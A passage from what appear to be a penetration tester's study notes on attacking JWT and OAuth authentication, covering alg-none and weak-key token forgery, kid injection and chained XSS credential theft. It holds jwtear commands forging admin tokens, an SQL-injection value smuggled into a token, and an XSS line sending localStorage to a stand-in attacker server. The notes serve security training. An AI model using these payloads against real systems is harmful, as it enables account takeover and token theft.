+</code></pre><h3 id="d80f987d-858c-49e7-8fda-a017978cbfad" class=""><strong>To sign an unsigned token, the process is as follows:</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#to-sign-an-unsigned-token-the-process-is-as-follows"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="88867e1a-40c4-4798-852a-708023f51180" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- unsignedToken = encodedBase64(header) + &#x27;.&#x27; + encodedBase64(payload)
+- signature_encoded = encodedBase64(HMAC-SHA256(&quot;secret&quot;, unsignedToken))
+- jwt_token = encodedBase64(header) + &quot;.&quot; + encodedBase64(payload) + &quot;.&quot; + signature_encoded
+</code></pre><h3 id="6089c568-15ed-4e23-96ad-708d57541130" class=""><strong>JWT Security Facts</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#jwt-security-facts"></a></strong></h3><p id="438de6b1-ab77-4615-9c99-3ea07ddeeb8f" class="">JWT is not vuln to CSRF (except when JWT is put in a cookie)</p><ul id="c2f770a2-f621-4c63-9b32-aba386c57739" class="bulleted-list"><li style="list-style-type:disc">Session theft through an XSS attack is possible when JWT is used</li></ul><ul id="2a34d045-272c-4a61-b4e1-5d9b438b90ca" class="bulleted-list"><li style="list-style-type:disc">Improper token storage (HTML5 storage/cookie)</li></ul><ul id="f0b7039d-821a-4482-b620-eccab9ddc3f6" class="bulleted-list"><li style="list-style-type:disc">Sometimes the key is weak and can be brute-forced</li></ul><ul id="ce10fa77-f77f-4b47-99a9-0b5a267c3a55" class="bulleted-list"><li style="list-style-type:disc">Faulty token expiration</li></ul><ul id="cb84980c-d622-440b-8bdd-931fe9568e28" class="bulleted-list"><li style="list-style-type:disc">JWT can be used as Bearer token in a custom authorization header</li></ul><p id="7000beeb-cf81-4943-b875-9b2ece599c8d" class="">JWT is being used For stateless applications. JWT usage results in no server-side storage and database-based session management. All info is put inside a signed JWT token:</p><ul id="a3238f02-0cf0-42c1-8607-07e0c28d25a0" class="bulleted-list"><li style="list-style-type:disc">only relying on the secret key</li></ul><ul id="37acb15b-d8b2-443f-9524-86fa589c8bd5" class="bulleted-list"><li style="list-style-type:disc">logging out or invalidating specific users is not possible due to the above stateless approach. The same signing key is used For everyone.</li></ul><p id="64229b02-43dc-4fef-90be-9dffb2bb2b81" class="">JWT-based authentication can become insecure when client-side data inside the JWT are blindly trusted</p><p id="5eaa31f8-907c-4f0e-b2ef-9ab83d96d920" class="">Many apps blindly accept the data contained in the payload (no signature verification)</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cb7a653b-87bb-488d-b147-395d5f1dc4eb" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- try submitting various injection-related strings
+- try changing a users role to admin
+</code></pre><p id="014ec671-676f-4b9c-a846-45993c3d1eec" class="">Many apps have no problem accepting an empty signature (effectively no signature)</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="78b1c8f1-5b42-405d-8558-e6667539f3b1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- the above is also known as &quot;the admin party in JWT&quot;
+- this is by design, to support cases when tokens have already been verified through another way
+- when assessing JWT endpoints set the alg to none and specify anything in the payload
+</code></pre><p id="3ba24078-8815-44ea-8148-bba1b75f85f5" class="">Moreover JWT Security information:</p><p id="79b15208-bbdb-4b73-9f45-56a6ea393b81" class="">→ https://www.reddit.com/r/netsec/comments/dn10q2/practical_approaches_for_testing_and_breaking_jwt/</p><h3 id="55a2741a-48aa-4a9d-b65b-8ef12b24a304" class=""><strong>Tools for assessing/attacking JWT</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#tools-for-assessingattacking-jwt"></a></strong></h3><p id="f77fdf09-d5a0-434e-9eaf-c524b9d2ffaa" class="">→ https://github.com/KINGSABRI/jwtear</p><p id="dc889d94-1221-4438-beec-065fcb7e7aee" class="">HMAC SHA256 signed token creation example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f58c1bc9-3c69-4380-811f-7b5e2569dcd8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">jwtear --generate-token --header &#x27;{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;}&#x27; --payload &#x27;{&quot;login&quot;:&quot;admin&quot;}&#x27; --key &#x27;cr@zyp@ss&#x27;
+</code></pre><p id="c2833653-5e0e-4775-904f-d06c15bbdf34" class="">Empty signature token creating example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8f933393-9725-4f10-9dbf-43ef6699598b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">jwtear --generate-token --header &#x27;{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;none&quot;}&#x27; --payload &#x27;{&quot;login&quot;:&quot;admin&quot;}&#x27;
+</code></pre><p id="8bc45b77-4e16-4b54-872f-52f547e3e79b" class="">Testing For injection example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7c74f88a-88e6-4638-b273-5a2db12dcdb2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">jwtear --generate-token --header &#x27;{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;none&quot;}&#x27; --payload $&#x27;{&quot;login&quot;:&quot;admin\&#x27; or \&#x27;a\&#x27;=\&#x27;a&quot;}&#x27;                  &quot;
+// $ is used to escapse single quotes
+</code></pre><h3 id="a665d697-be30-4ac3-bc9f-e1ca8a9238a4" class=""><strong>JWT Attack Scenario 1</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#jwt-attack-scenario-1"></a></strong></h3><p id="1c3bc335-d795-4ce7-b65e-b888c63507ef" class="">brute-forcing/guessing the secret used to sign a token:</p><figure id="7e924004-7979-46e4-84c8-568fe127ec95" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/71.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/71.png"/></a></figure><h3 id="3eaadd4d-17b9-4e28-b164-b62a4d9b4934" class=""><strong>JWT Attack Scenario 2</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#jwt-attack-scenario-2"></a></strong></h3><p id="916affbb-b85c-4f88-adf8-f472837e596b" class="">When attacking authentication through an XSS vuln, we usually try to capture a victims cookie as follows:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b6ad2d85-6b00-4bbb-b557-10be54d17c1c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre><p id="9913d1bb-5f2d-49c4-8629-d831aa1c9860" class="">When JWT is employed an localStorage is used, we can attack authentication through XSS using JSON.stringify:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cb28602c-34ba-438e-a7fd-aaa76872cb41" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"> &lt;img src=&#x27;https://attacker-server/yikes?jwt=&#x27;+JSON.stringify(localStorage);&#x27;--!&gt;
+</code></pre><blockquote id="46cc4660-1289-4479-83b4-3e0c8e8446e1" class="">If u obtain an IdToken, u can use it to authenticate and impersonate the victim If u obtain an accessToken, u can use it to generate a newIdToken with the help of the authentication endpoint</blockquote><h3 id="3b7d8f92-6595-4a52-8d20-01ff538cae27" class=""><strong>JWT Attack Scenario 3</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#jwt-attack-scenario-3"></a></strong></h3><p id="26eb66e7-ad07-4c23-8164-26addc3ee1fe" class="">A bitcoin CTF challenge that included JWT:</p><ul id="1b2e4e7e-5b54-41f8-99a5-62e0e23eb980" class="bulleted-list"><li style="list-style-type:disc">uppon successful login, the user is issued a JWT inside a cookie</li></ul><ul id="39cdddc6-5a8b-444b-94db-cc662f0ff6be" class="bulleted-list"><li style="list-style-type:disc">HS256 is used</li></ul><ul id="f7ab2338-07bc-42dd-ba5e-61746ab8a878" class="bulleted-list"><li style="list-style-type:disc">A user named admin exists</li></ul><ul id="c4dc53fb-df4e-40e9-8df7-4c656ea91e75" class="bulleted-list"><li style="list-style-type:disc">One of the field in the JWT header, kid, is used by the server to retrieve the key and verify the signature. The problem is that no proper escaping takes place while doing so.</li></ul><blockquote id="1d37f98b-26bd-4aa8-8dd9-a87d93e8fa3a" class="">If an attacker manages to control or inject to kid’, he will be able to create his own signed tokens (since kid is essentially the key that is used to verify the signature)</blockquote><p id="7647d49e-b0ee-4836-aa73-73a68f7ffa82" class="">What we can do: Inject <strong>kid</strong> and specify a value that resides on the web server and can be predicted (as well as retrieved by the server of course)</p><ul id="f5eec5d3-a0ce-415c-ac67-16105b5ae490" class="bulleted-list"><li style="list-style-type:disc">through provoking errors we identified that the application is using <strong>sinatra</strong> under the hood</li></ul><ul id="48acde46-ba66-4422-b4fb-8e66505d1160" class="bulleted-list"><li style="list-style-type:disc">such a value could be ‘public/css/bootstrap.css’ &lt;- this value comes from sinatras documentation/best practices and its a legitimate value since no proper escaping occurs while retrieving <strong>kid</strong></li></ul><figure id="640c07d1-876d-4754-942c-4a2c2876d2b8" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/72.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/72.png"/></a></figure><figure id="c7022550-f717-481b-b328-ec2ed96bd31e" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/73.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/73.png"/></a></figure><h2 id="0e14a437-e718-4abb-bacf-7bbe475d132e" class=""><strong>OAuth</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#oauth"></a></strong></h2><p id="0e65df51-23ef-4839-8cdf-7266b09802da" class="">Its the main web standard For authorization between services. Its used to authorize 3rd party apps to access services or data from a provider with which you have an account.</p><h3 id="df842623-c53a-4fd0-8e19-02ff32c5ba23" class=""><strong>OAuth Components:</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#oauth-components"></a></strong></h3><ul id="305b634d-8683-4c61-b525-2cbfdf7db1b4" class="bulleted-list"><li style="list-style-type:disc"><strong>Resource Owner</strong>: the entity that can grant access to a protected resource. Typically this is the end-user</li></ul><ul id="cbc69e11-0a07-4f32-a0ac-4e85e896c348" class="bulleted-list"><li style="list-style-type:disc"><strong>Client</strong>: an application requesting access to a protected resource on behalf of the resource owner. This is also called a Relying Party</li></ul><ul id="c38ea9de-eed2-415d-a3c7-72987af336b0" class="bulleted-list"><li style="list-style-type:disc"><strong>Resource Server</strong>: the server hosting the protected resources. This is the API you want to access, in our case gallery</li></ul><ul id="f726b51f-53f1-4ce4-82d5-db815dce11ed" class="bulleted-list"><li style="list-style-type:disc"><strong>Authorization server</strong>: the server that authenticates the Resource Owner, and issues access tokens after getting proper authorization. This is also called an identity provider (IdP)</li></ul><ul id="3bf56998-50f3-412d-aca0-5cd1847e45cb" class="bulleted-list"><li style="list-style-type:disc"><strong>User Agent</strong>: the agent used by the Resource Owner to interact with the Client, For example a browser or a mobile application.</li></ul><h3 id="c4d7ee01-be05-4a9d-acf9-969c95ef4efb" class=""><strong>OAuth Scopes (actions or privilege requested from the service - visible through the scope parameter):</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#oauth-scopes-actions-or-privilege-requested-from-the-service---visible-through-the-scope-parameter"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4a0737bc-87d1-4f97-9ccb-09e3d8bd3c07" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Read
+- Write
+- Access Contacts
+</code></pre><h3 id="48d18b87-ce01-4ef7-bf1c-682ddfd47902" class=""><strong>OAuth 2.0</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#oauth-20"></a></strong></h3><ol type="1" id="a0e9838e-9b60-4d09-aa16-189efb136c97" class="numbered-list" start="1"><li>The <strong>authorization code grant</strong>: the client redirects the user (Resource Owner) to an Authorization server to ask the user whether the Client can access her Resources. After the user confirms, the Client obtains an Authorization Code that the Client can exchange For an Access Token. This Access Token enables the Client to access the Resources of the Resources Owner.</li></ol><ol type="1" id="c6a5de9a-45ee-4cbc-a083-a012e7b49148" class="numbered-list" start="2"><li>The <strong>implicit grant</strong> is a simplification of the authorization code grant. The client obtains the Access Token directly rather than being issued an Authorization Code.</li></ol><ol type="1" id="c16f9341-2c82-4e1d-ae47-094e8bbb2b95" class="numbered-list" start="3"><li>The <strong>resource owner password credentials grant</strong> enables the Client to obtain an Access Token by using the username and password of the Resource Owner.</li></ol><ol type="1" id="fea978d0-8ed3-4076-9e79-a09f4412f243" class="numbered-list" start="4"><li>The <strong>client credentials grant</strong> enables the Client to obtain an Access Token by using its own credentials.</li></ol><blockquote id="3a7bd2e6-9790-4922-ab8a-d3cb462effaf" class="">Clients can obtain Access Tokens via 4 different flows Clients use these Access Tokens to access an API</blockquote><blockquote id="ad2d2c97-cf48-4882-88a5-8548e672da7f" class="">The Access Tokens is almost always a bearer token Some applications use JWT as access tokens</blockquote><h2 id="e2573434-300f-4c71-9613-dcfce3ca9392" class=""><strong>Common OAuth Attacks</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#common-oauth-attacks"></a></strong></h2><figure id="5202ac3e-0dff-4ddf-9c3d-8ed282d7c8e3" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/81.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/81.png"/></a></figure><h3 id="97824647-57d0-4bdd-a520-2bb48ee1bcf9" class=""><strong>Unvalidated RedirectURI Parameter</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#unvalidated-redirecturi-parameter"></a></strong></h3><p id="5474f71b-b071-4051-9c55-46a01b027356" class="">If the authorization server does not validate that the redirect URI belongs to the client, its susceptible to two types of attacks:</p><ul id="06a0f43f-5699-472d-aff3-e48d231b17c1" class="bulleted-list"><li style="list-style-type:disc">Open Redirect</li></ul><ul id="f60643ba-16d5-45f3-b963-ca7bf230b870" class="bulleted-list"><li style="list-style-type:disc">Account hijacking by stealing authorization codes.</li></ul><figure id="878e0353-6b9c-4864-bc7b-41909bd77fca" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/80.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/80.png"/></a></figure><blockquote id="e95b4f0b-2dd8-4e83-ac75-ab3a7191b016" class="">If an attacker redirects to a site under their control, the authorization code - which is part of the URI - is given to them. They may be able to exchange if For an access token and thus get access to the users resources.</blockquote><h3 id="da08da75-b1b9-45a3-a4f5-c07d03b2805a" class=""><strong>Weak Authorization Codes</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#weak-authorization-codes"></a></strong></h3><p id="6c3cb58e-5bba-4ebb-b13b-64489acc861d" class="">If the authorization codes are weak, an attacker may be able to guess them at the token endpoint. This is especially true if the client secret is compromised, not used, or not validated.</p><figure id="1259cd19-eb76-40b7-9ee2-eba2d9d8dc3e" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/74.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/74.png"/></a></figure><h3 id="3f1cd7bf-82fb-44b0-8962-98d2e2244bca" class=""><strong>Everlasting Authorization Codes</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#everlasting-authorization-codes"></a></strong></h3><p id="de33f2e2-eeee-46c8-8731-17981d5aca6a" class="">Expiring unused authorization codes limits the window in which an attacker can use captured or guessed authorization codes, but thats not always the case.</p><figure id="fc4e23e6-cb65-45bf-bb2c-12ef1040987e" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/75.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/75.png"/></a></figure><h3 id="ea796ff9-0788-4d62-87ef-3548274c9e57" class=""><strong>Authorization Codes Not Bound to Client</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#authorization-codes-not-bound-to-client"></a></strong></h3><p id="c8166dba-f8be-46d2-b36d-302ca790f347" class="">An attacker can exchange captured or guessed authorization codes For access tokens by using the credentials For another, potentially malicious, client.</p><figure id="44d13612-e89b-41d3-9379-f5d1f91465f5" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/76.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/76.png"/></a></figure><h3 id="d22c9286-fceb-4c35-ad1d-03b073cce25c" class=""><strong>Weak Handle-Based Access and Refresh Tokens</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#weak-handle-based-access-and-refresh-tokens"></a></strong></h3><p id="39e818ec-d1d3-4d62-8ee6-9302d31e0aef" class="">If the tokens are weak, an attacker may be able to guess them at the resource server or the token endpoint.</p><figure id="55bced00-41b7-454b-849a-7c18c3f699b5" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/77.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/77.png"/></a></figure><h2 id="f83cfbd2-776d-4e5f-842c-c1d216862eaf" class=""><strong>Insecure Storage of Handle-Based Access and Refresh Tokens</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#insecure-storage-of-handle-based-access-and-refresh-tokens"></a></strong></h2><p id="81e13c95-7537-42e7-a8e2-f5505b3286cc" class="">If the handle-based tokens are stored as plain text, an attacker may be able to obtain them from the database at the resource server or the token endpoint.</p><figure id="a202bd79-abc0-456a-a626-c7b6244c0593" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/78.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/78.png"/></a></figure><h3 id="5ae3329f-bece-48d5-858b-0456e1e63316" class=""><strong>Refresh Token not Bound to Client</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#refresh-token-not-bound-to-client"></a></strong></h3><p id="f19bdee3-2dd3-4f4f-9b13-31188abc485c" class="">If the binding between a refresh token and the client is not validated, a malicious client may be able to exchange captured or guessed refresh tokens For access tokens. This is especially problematic if the application allows automatic registration of clients.</p><figure id="2a9590a0-6421-405a-974f-7df1b9994285" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/79.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/79.png"/></a></figure><h3 id="98331307-2d9f-4393-b3bf-f2c46dfa3891" class=""><strong>OAuth Attack Scenario 2</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#oauth-attack-scenario-2"></a></strong></h3><p id="fa3401c5-b5ad-4555-8812-7e41876fc80e" class="">In this scenario, we r gonna see an OAuth-Based XSS vuln was chained with an insecure X-Frame-Options header and an enabled Autocomplete functionality to provide the attacker with User/Admin credentials.</p><blockquote id="d7bb5303-dd43-4bed-aebb-c3fca6b08317" class="">This attack was discovered when pentesting the first iterations of the Open Bank Project (OBP)</blockquote><p id="6e123e1a-6e04-4600-a90e-a948adfba20a" class="">Step 0: We identified that the redirectUrl parameter is vulnerable to reflected cross-site scripting (XSS) attacks due to inadequate sanitization of user supplied data.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c493e876-661e-47ac-82bf-76e8d167ff3d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Vulnerable parameter: &#x27;redirectUrl&#x27;
+Page resource: &#x27;http://openbankdev:8080/oauth/thanks&#x27;
+Attack vector: http://openbankdev:8080/oauth/thanks?redirectUrl=[JS attack vector]
+</code></pre><p id="03bc852f-29d1-4a82-a7c5-4053d1875c2a" class=""><strong>Step 1</strong>:</p><p id="e19e5b56-4181-4ca0-ba7e-09807ce469e3" class="">The following image displays that we were able to load a malicious JavaScript into the vulnerable OBP web page from an external location. The payload depicted is jQuery specific.</p><figure id="ddf866b8-cf85-44b9-9dc7-8c4ea747a471" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/82.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/82.png"/></a></figure><p id="ffbb78bb-59f9-49ea-a972-1817defb968d" class=""><strong>Step 2</strong>:</p><p id="950fa269-b953-4e61-b960-52313be90105" class="">Utilizing the inject JavaScript we created an invisible iframe that contained OBPs login page. That was possible due to the fact that the X-Frame-Options header of OBPs login page was set to the SAMEORIGIN value.</p><figure id="5d2c8c2c-2a91-4d3b-b434-4e4f350603f4" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/83.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/83.png"/></a></figure><p id="e2f185e6-df10-4445-b830-8997656b257a" class=""><strong>Step 3</strong>:</p><p id="63b0aac9-c496-4694-af6d-bb59646d2f99" class="">We finally injected the following JavaScript code to access the iframes forms that contained user credentials due to the fact that Autocomplete functionality was not explictly disabled</p><figure id="0eb5ee73-603c-40ba-8baa-d2bc59cc8536" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/84.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/84.png"/></a></figure><p id="b1133190-94e5-42e2-a1d1-f9dfcb165b54" class=""><strong>Step 4</strong>:</p><p id="b9bc87ef-08b0-4830-ad34-7709310ecbca" class="">A previously set up netcat listener received the targer users password</p><figure id="26ecdd74-0fdb-446e-8b08-0a7bd8385a17" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/85.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/85.png"/></a></figure><p id="7c86af37-7e02-45ae-a662-568f9653b0b8" class=""><strong>Bonus Step</strong>:</p><p id="cdc1f141-30a2-4555-8815-47dcfe7211f0" class="">We also chained the above mentioned OAuth-based XSS vuln with the insufficiently secure X-Frame-Options header of the <strong>GET API Key</strong> page (which was set to SAMEORIGIN) and a CSRF vulnerability on the API creation functionality</p><figure id="bc5fd31a-7e03-4251-8353-13689b8427f7" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/86.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/86.png"/></a></figure><p id="cd6b3b24-af5a-42c4-a321-799f7895f2ec" class=""><strong>Bonus Step</strong>:</p><p id="0ede9a5e-232c-4f5b-9661-81beadc7846e" class="">We finally inject a JavaScript function, similar to the one used For the remote credential theft attack, to access the iframes contents including the created applications API key. This time, a remote API key theft attack occured.</p><figure id="96764ce8-0968-42c9-a87e-f22152b2c1eb" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/87.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/87.png"/></a></figure><h3 id="9bef4a53-b321-42a0-a26b-7fe2f4667802" class=""><strong>OAuth Attack Scenario 3</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#oauth-attack-scenario-3"></a></strong></h3><p id="fa35a601-fbf3-4f83-82db-4b4135f9e67b" class="">Attacking the <strong>Connect</strong> request</p><ul id="d44694d6-3407-42b3-b3af-1cf90635f8a5" class="bulleted-list"><li style="list-style-type:disc">This attack exploits the first request (when a user clicks the <strong>Connect</strong> or <strong>Sign in with</strong> button).</li></ul><ul id="552355cd-68eb-4d0b-b4d8-c807647ef8dc" class="bulleted-list"><li style="list-style-type:disc">User are many times allowed by websites to connect additional accounts like Google, using OAuth. An attacker can gain access to the victims account on the Client by connecting one of his/her own account (on the Provider)</li></ul><figure id="e27cb8d2-a6b0-4e03-8e45-890ee634665f" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/88.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/88.png"/></a></figure><h3 id="4551b08b-c616-47c6-8999-29a06036b849" class=""><strong>OAuth Attack Scenario 4</strong><strong><a 